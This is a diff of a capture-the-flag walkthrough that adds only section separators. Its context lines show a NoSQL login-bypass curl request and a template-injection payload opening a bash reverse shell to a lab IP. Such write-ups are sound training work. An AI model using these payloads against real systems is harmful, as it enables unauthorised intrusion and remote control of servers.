@@ -38,6 +38,8 @@ So, let's check the website first.
 
 ![image-1428](/assets/img/obsidian/do-not-disturb/image-1428.png)
 
+---
+
 ## Login Bypass
 
 `curl -i -s -c cookie.txt -d 'username=attendant&password[$ne]=x' http://10.48.173.139/login`
@@ -66,6 +68,8 @@ We got a cookie at the `/staff `location
 
 ![image-1430](/assets/img/obsidian/do-not-disturb/image-1430.png)
 
+---
+
 ## Template Injection
 
 Now, we're gonna perform **template injection**
@@ -89,6 +93,8 @@ curl -s -b cookie.txt --data-urlencode 'template=<%=global.process.mainModule.re
 curl -s -b cookie.txt --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.141.248/4444 0>&1\"').toString() %>" http://10.48.173.139/staff/preview 
 ```
 
+---
+
 ## Reverse shell
 ![image-1433](/assets/img/obsidian/do-not-disturb/image-1433.png)
 
@@ -99,6 +105,8 @@ curl -s -b cookie.txt --data-urlencode "template=<%= global.process.mainModule.r
 Found the first flag at `/home/poolside/user.txt`
 
 ![image-1436](/assets/img/obsidian/do-not-disturb/image-1436.png)
+
+---
 
 ## Node Debugger
 
@@ -134,6 +142,8 @@ The debugger runs our commands as `pipelinesvc`, and `id` shows this account bel
 It shows we are in the disk group.
 
 ![image-1440](/assets/img/obsidian/do-not-disturb/image-1440.png)
+
+---
 
 ## Read the Root Flag
 
